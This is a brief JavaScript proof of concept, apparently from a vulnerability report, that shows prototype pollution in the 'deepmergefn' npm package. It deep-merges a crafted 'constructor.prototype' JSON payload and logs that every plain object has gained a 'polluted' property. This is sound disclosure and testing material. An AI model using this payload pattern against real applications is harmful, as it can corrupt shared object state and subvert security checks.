var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const deepMerge = require('deepmergefn');
console.log({}.polluted);
EVIL_DATA = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
deepMerge(obj, EVIL_DATA);
console.log({}.polluted);